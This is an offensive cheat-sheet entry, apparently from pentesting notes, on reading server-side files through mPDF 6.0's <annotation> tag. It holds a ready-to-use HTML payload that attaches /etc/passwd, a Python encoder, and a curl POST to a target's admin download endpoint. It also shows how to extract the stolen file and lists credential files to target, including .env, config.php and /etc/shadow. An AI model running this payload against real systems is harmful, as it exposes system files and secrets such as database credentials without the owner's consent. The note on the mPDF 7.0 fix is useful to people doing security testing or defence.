# mPDF Annotation File Read (≤6.0)

mPDF ≤6.0 supports a custom `<annotation>` HTML tag that attaches arbitrary local files to the generated PDF as attachments. This allows reading server-side files when you can inject HTML into PDF generation.

## Payload

```html
<!-- Inject into a field that gets rendered into a PDF -->
<annotation
  file="/etc/passwd"
  content="/etc/passwd"
  icon="Graph"
  title="Attached File: /etc/passwd"
  pos-x="195" />
```

## How to Deliver

The target endpoint typically accepts POST data with `content` or `pdf` parameter containing base64/URL-encoded HTML:

```bash
# URL-encode the annotation HTML, then base64-encode the result
python3 -c "
import base64, urllib.parse
payload = '<annotation file=\"/etc/passwd\" content=\"/etc/passwd\" icon=\"Graph\" title=\"Attached File: /etc/passwd\" pos-x=\"195\" />'
encoded = base64.b64encode(urllib.parse.quote(payload).encode()).decode()
print(encoded)
"

# Send to the PDF endpoint
curl -s -X POST 'http://<TARGET>/admin/download.php' \
  --data "pdf=<ENCODED_PAYLOAD>" -o out.pdf

# Open out.pdf; the file is attached — click paperclip or extract with pdfminer
```

## Extract Attachment from PDF

```bash
# Extract attachments using pdfminer or python
python3 -c "
import PyPDF2
reader = PyPDF2.PdfReader('out.pdf')
for page in reader.pages:
    print(page.extract_text())
"
# Or simply open with a PDF viewer and click the paperclip icon
```

## Notes
- Fixed in mPDF 7.0 via `allowAnnotationFiles` config key (disabled by default)
- Check mPDF version: look in `composer.lock`, `vendor/mpdf/mpdf/CHANGELOG.md`
- Source files to target: `db_connect.php`, `config.php`, `.env`, `/etc/shadow`
- URL + base64 encoding is often required to pass the payload through the application
